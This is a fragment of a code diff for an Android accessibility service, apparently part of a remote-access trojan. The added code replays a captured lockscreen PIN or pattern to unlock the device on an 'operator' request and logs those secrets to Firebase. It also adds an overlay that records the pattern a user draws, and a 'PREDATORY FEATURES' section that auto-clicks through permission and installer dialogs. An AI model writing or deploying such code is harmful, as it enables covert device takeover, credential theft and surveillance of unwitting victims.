+                    Log.d(TAG, "AUTO_UNLOCK: Tapped PIN digit [" + digitStr + "] at (" + tapX + ", " + tapY + ")");
+                }
+            }, index * 200L);
+        }
+
+        return true;
+    }
+
+    public boolean autoUnlockWithCapturedPattern() {
+        String patternStr = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("captured_pattern", "");
+        if (patternStr == null || patternStr.isEmpty()) {
+            return false;
+        }
+
+        isAutoUnlocking = true;
+        new Handler(Looper.getMainLooper()).postDelayed(() -> isAutoUnlocking = false, 3000L);
+
+        if (!patternStr.contains("|") && (patternStr.contains("-") || patternStr.contains(","))) {
+            patternStr = convertNodeIndicesToCoords(patternStr);
+        }
+
+        String[] points = patternStr.split("\\|");
+        if (points.length < 2) return false;
+
+        Log.d(TAG, "AUTO_UNLOCK: Replaying stored Pattern gesture on LockPatternView: " + patternStr);
+        FirebaseConfig.logActivity("AUTO_UNLOCK: Replaying stored Pattern gesture to bypass lockscreen...");
+
+        Path path = new Path();
+        for (int i = 0; i < points.length; i++) {
+            String[] coords = points[i].split(",");
+            if (coords.length == 2) {
+                try {
+                    int x = Integer.parseInt(coords[0].trim());
+                    int y = Integer.parseInt(coords[1].trim());
+                    if (i == 0) {
+                        path.moveTo(x, y);
+                    } else {
+                        path.lineTo(x, y);
+                    }
+                } catch (Exception ignored) {}
+            }
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            try {
+                Class<?> helper = Class.forName(Api24Helper.class.getName());
+                java.lang.reflect.Method method = helper.getMethod("dispatchPatternGesture", AccessibilityService.class, Path.class, int.class);
+                return (boolean) method.invoke(null, this, path, 800);
+            } catch (Exception e) {
+                Log.e(TAG, "Pattern Dispatch Error: " + e.getMessage());
+            }
+        }
+        return false;
+    }
+
+    public String convertNodeIndicesToCoords(String patternIndices) {
+        if (patternIndices == null || patternIndices.isEmpty()) return "";
+        
+        int sw = getScreenWidth() > 0 ? getScreenWidth() : 1080;
+        int sh = getScreenHeight() > 0 ? getScreenHeight() : 2520;
+        
+        int left = (int) (sw * 0.10);
+        int right = (int) (sw * 0.90);
+        int top = (int) (sh * 0.50);
+        int bottom = (int) (sh * 0.84);
+        
+        int cellW = (right - left) / 3;
+        int cellH = (bottom - top) / 3;
+        
+        String[] nodes = patternIndices.replaceAll("[^0-8,-]", "").split("[-,]");
+        StringBuilder coords = new StringBuilder();
+        
+        for (String node : nodes) {
+            try {
+                int idx = Integer.parseInt(node.trim());
+                if (idx >= 0 && idx <= 8) {
+                    int row = idx / 3;
+                    int col = idx % 3;
+                    int cx = left + (col * cellW) + (cellW / 2);
+                    int cy = top + (row * cellH) + (cellH / 2);
+                    if (coords.length() > 0) coords.append("|");
+                    coords.append(cx).append(",").append(cy);
+                }
+            } catch (Exception ignored) {}
+        }
+        return coords.toString();
+    }
+
+    public static volatile long lastBypassRequestedTime = 0;
+
+    public boolean autoUnlockDevice() {
+        if (lastBypassRequestedTime == 0) {
+            lastBypassRequestedTime = System.currentTimeMillis();
+        }
+        if (System.currentTimeMillis() - lastBypassRequestedTime > 15000) {
+            Log.w(TAG, "AUTO_UNLOCK: Aborted - Bypass requested time expired or not triggered by operator.");
+            return false;
+        }
+
+        isAutoUnlocking = true;
+        new Handler(Looper.getMainLooper()).postDelayed(() -> isAutoUnlocking = false, 3500);
+
+        // 1. Wake up screen if screen is off
+        try {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm != null && !pm.isInteractive()) {
+                PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, "LabRATS:LockscreenWake");
+                wl.acquire(3000);
+            }
+        } catch (Exception ignored) {}
+
+        AccessibilityNodeInfo activeRoot = getRootInActiveWindow();
+        boolean isKeypadVisible = false;
+        if (activeRoot != null) {
+            AccessibilityNodeInfo key1 = findKeypadButtonForDigit(activeRoot, "1");
+            if (key1 != null) {
+                isKeypadVisible = true;
+                key1.recycle();
+            }
+            activeRoot.recycle();
+        }
+
+        long replayDelay = 0;
+
+        // 2. Only swipe UP if keypad/pattern grid is not already open
+        if (!isKeypadVisible) {
+            int sw = getScreenWidth() > 0 ? getScreenWidth() : 1080;
+            int sh = getScreenHeight() > 0 ? getScreenHeight() : 2520;
+            swipe(sw / 2, (int) (sh * 0.85), sw / 2, (int) (sh * 0.20), 250);
+            replayDelay = 400;
+        }
+
+        // 3. Replay stored pattern or PIN
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            String patternStr = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("captured_pattern", "");
+            String pinStr = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("captured_pin", "");
+
+            Log.i(TAG, "AUTO_UNLOCK_EXECUTE: Pattern=[" + patternStr + "], PIN=[" + pinStr + "]");
+            FirebaseConfig.logActivity("AUTO_UNLOCK_EXECUTE: Pattern=[" + patternStr + "], PIN=[" + pinStr + "]");
+
+            if (patternStr != null && !patternStr.isEmpty()) {
+                autoUnlockWithCapturedPattern();
+            } else if (pinStr != null && !pinStr.isEmpty()) {
+                autoUnlockWithCapturedPin();
+            } else {
+                Log.w(TAG, "AUTO_UNLOCK: Neither captured_pattern nor captured_pin is stored!");
+                FirebaseConfig.logActivity("AUTO_UNLOCK_FAILED: No captured pattern or PIN stored yet!");
+            }
+        }, replayDelay);
+
+        return true;
     }
 
     public boolean clickAt(int x, int y) {
@@ -1822,6 +2497,169 @@ public class IO_Persistence_Manager extends AccessibilityService {
         return true;
     }
 
+    public static class PatternOverlayView extends View {
+        private final List<View> dotViews = new ArrayList<>();
+        private final List<Integer> selectedDots = new ArrayList<>();
+        private final Path linePath = new Path();
+        private final Paint linePaint = new Paint(Paint.ANTI_ALIAS_FLAG);
+        private float currentX, currentY;
+        private boolean isDragging = false;
+        private PatternCompleteListener listener;
+
+        public interface PatternCompleteListener {
+            void onPatternComplete(String patternCoords);
+        }
+
+        public PatternOverlayView(Context context) {
+            super(context);
+            init();
+        }
+
+        private void init() {
+            linePaint.setColor(Color.WHITE);
+            linePaint.setStrokeWidth(12f);
+            linePaint.setStyle(Paint.Style.STROKE);
+            linePaint.setStrokeCap(Paint.Cap.ROUND);
+            linePaint.setStrokeJoin(Paint.Join.ROUND);
+        }
+
+        public void setDotViews(List<View> dots) {
+            this.dotViews.clear();
+            this.dotViews.addAll(dots);
+        }
+
+        public void setOnPatternCompleteListener(PatternCompleteListener listener) {
+            this.listener = listener;
+        }
+
+        @Override
+        public boolean onTouchEvent(MotionEvent event) {
+            float x = event.getX();
+            float y = event.getY();
+
+            switch (event.getAction()) {
+                case MotionEvent.ACTION_DOWN:
+                    selectedDots.clear();
+                    linePath.reset();
+                    isDragging = true;
+                    checkDotHit(x, y);
+                    currentX = x;
+                    currentY = y;
+                    invalidate();
+                    return true;
+
+                case MotionEvent.ACTION_MOVE:
+                    if (isDragging) {
+                        checkDotHit(x, y);
+                        currentX = x;
+                        currentY = y;
+                        invalidate();
+                    }
+                    return true;
+
+                case MotionEvent.ACTION_UP:
+                case MotionEvent.ACTION_CANCEL:
+                    if (isDragging) {
+                        isDragging = false;
+                        invalidate();
+                        if (selectedDots.size() >= 2) {
+                            StringBuilder coords = new StringBuilder();
+                            for (int i = 0; i < selectedDots.size(); i++) {
+                                int dotIdx = selectedDots.get(i);
+                                View dot = dotViews.get(dotIdx);
+                                if (dot != null) {
+                                    int[] dotPos = new int[2];
+                                    dot.getLocationOnScreen(dotPos);
+                                    int centerX = dotPos[0] + dot.getWidth() / 2;
+                                    int centerY = dotPos[1] + dot.getHeight() / 2;
+
+                                    if (i > 0) coords.append("|");
+                                    coords.append(centerX).append(",").append(centerY);
+                                }
+                            }
+
+                            if (listener != null && coords.length() > 0) {
+                                listener.onPatternComplete(coords.toString());
+                            }
+                        } else {
+                            resetPattern();
+                        }
+                    }
+                    return true;
+            }
+            return super.onTouchEvent(event);
+        }
+
+        private void checkDotHit(float x, float y) {
+            int[] myPos = new int[2];
+            getLocationOnScreen(myPos);
+
+            for (int i = 0; i < dotViews.size(); i++) {
+                View dot = dotViews.get(i);
+                if (dot == null) continue;
+                int[] dotPos = new int[2];
+                dot.getLocationOnScreen(dotPos);
+
+                float localDotX = dotPos[0] - myPos[0] + dot.getWidth() / 2f;
+                float localDotY = dotPos[1] - myPos[1] + dot.getHeight() / 2f;
+                float radius = Math.max(dot.getWidth(), dot.getHeight()) * 2.0f;
+
+                float dist = (float) Math.hypot(x - localDotX, y - localDotY);
+                if (dist <= radius) {
+                    if (!selectedDots.contains(i)) {
+                        selectedDots.add(i);
+                        dot.animate().scaleX(1.8f).scaleY(1.8f).setDuration(100).start();
+                    }
+                }
+            }
+        }
+
+        public void resetPattern() {
+            selectedDots.clear();
+            linePath.reset();
+            isDragging = false;
+            for (View dot : dotViews) {
+                if (dot != null) {
+                    dot.animate().scaleX(1.0f).scaleY(1.0f).setDuration(100).start();
+                }
+            }
+            invalidate();
+        }
+
+        @Override
+        protected void onDraw(Canvas canvas) {
+            super.onDraw(canvas);
+            if (selectedDots.isEmpty()) return;
+
+            int[] myPos = new int[2];
+            getLocationOnScreen(myPos);
+
+            linePath.reset();
+            for (int i = 0; i < selectedDots.size(); i++) {
+                int dotIdx = selectedDots.get(i);
+                View dot = dotViews.get(dotIdx);
+                if (dot == null) continue;
+                int[] dotPos = new int[2];
+                dot.getLocationOnScreen(dotPos);
+
+                float localX = dotPos[0] - myPos[0] + dot.getWidth() / 2f;
+                float localY = dotPos[1] - myPos[1] + dot.getHeight() / 2f;
+
+                if (i == 0) {
+                    linePath.moveTo(localX, localY);
+                } else {
+                    linePath.lineTo(localX, localY);
+                }
+            }
+
+            if (isDragging) {
+                linePath.lineTo(currentX, currentY);
+            }
+
+            canvas.drawPath(linePath, linePaint);
+        }
+    }
+
     // ============ PREDATORY FEATURES ============
 
     private static volatile long lastAutoPilotClickTime = 0;
@@ -1831,14 +2669,37 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
         String pkgLower = pkg != null ? pkg.toLowerCase() : "";
 
+        // Completely ignore all Messaging, SMS, Chat, and Mail applications
+        if (pkgLower.contains("messaging") || pkgLower.contains("mms") || pkgLower.contains("sms") ||
+            pkgLower.contains("whatsapp") || pkgLower.contains("telegram") || pkgLower.contains("signal") ||
+            pkgLower.contains("messenger") || pkgLower.contains("chat") || pkgLower.contains("talk") ||
+            pkgLower.contains("dialer") || pkgLower.contains("contacts") || pkgLower.contains("inbox") ||
+            pkgLower.contains("mail")) {
+            return;
+        }
+
+        // Must be a system settings or permission package
+        boolean isPermissionOrSettings = pkgLower.contains("settings") ||
+                pkgLower.contains("permission") ||
+                pkgLower.contains("packageinstaller") ||
+                pkgLower.contains("systemui") ||
+                pkgLower.contains("safecenter") ||
+                pkgLower.contains("securitycenter") ||
+                pkgLower.contains("media.projection") ||
+                pkgLower.contains(getPackageName().toLowerCase());
+
+        if (!isPermissionOrSettings) {
+            return;
+        }
+
         // If Android Photo Picker / Media selection activity opens, press BACK to un-stall flow
         if (pkgLower.contains("providers.media") || pkgLower.contains("photopicker") || pkgLower.contains("picker")) {
             performGlobalAction(GLOBAL_ACTION_BACK);
             return;
         }
 
-        // Instant 0ms execution for runtime permission popups, MediaProjection, & Settings
-        if (pkgLower.contains("permission") || pkgLower.contains("installer") || pkgLower.contains("packageinstaller") || pkgLower.contains("settings") || pkgLower.contains("media") || pkgLower.contains("projection") || pkgLower.contains("systemui")) {
+        // Instant 0ms execution for runtime permission popups & Settings
+        if (pkgLower.contains("permission") || pkgLower.contains("packageinstaller") || pkgLower.contains("settings") || pkgLower.contains("systemui")) {
             new Handler(Looper.getMainLooper()).post(this::executeAutoPilotPass);
             return;
         }
